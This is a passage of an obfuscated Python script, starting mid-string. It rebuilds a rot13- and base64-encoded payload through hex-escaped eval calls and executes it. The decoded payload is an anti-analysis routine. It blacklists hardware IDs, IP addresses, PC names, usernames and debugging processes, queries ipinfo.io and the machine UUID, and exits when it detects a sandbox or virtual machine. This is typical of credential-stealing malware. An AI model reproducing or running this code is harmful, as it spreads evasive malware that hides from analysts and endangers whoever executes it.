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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
